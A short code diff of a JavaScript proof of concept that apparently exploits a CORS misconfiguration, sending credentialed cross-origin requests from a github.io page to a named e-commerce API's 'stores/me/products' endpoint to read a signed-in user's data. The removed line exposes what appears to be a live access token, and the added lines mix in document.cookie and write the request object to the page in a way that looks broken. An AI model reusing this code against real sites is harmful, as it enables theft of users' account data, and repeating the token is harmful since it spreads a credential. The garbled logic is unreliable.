@@ -6,13 +6,14 @@ var x = new XMLHttpRequest();
 
   x.onreadystatechange = function() {
     if (x.readyState == XMLHttpRequest.DONE) {
-      document.getElementById('z').innerHTML = z;
+      var r = x + document.cookie;
+      document.getElementById('z').innerHTML = x;
     }
   }
 
 function cors(){
   if(x) {
-    x.open('GET', 'https://api.bukalapak.com/stores/me/products?limit=30&offset=0&product_type=all&sort=date&access_token=gipEC5GpnX4nEJg0kgUtaTozdRyBRqmFUNl1OKuqGaWWqA', true);
+    x.open('GET', 'https://api.bukalapak.com/stores/me/products', true);
     x.withCredentials = true;
     x.setRequestHeader("Origin", "https://irvandikky.github.io");
     x.send();
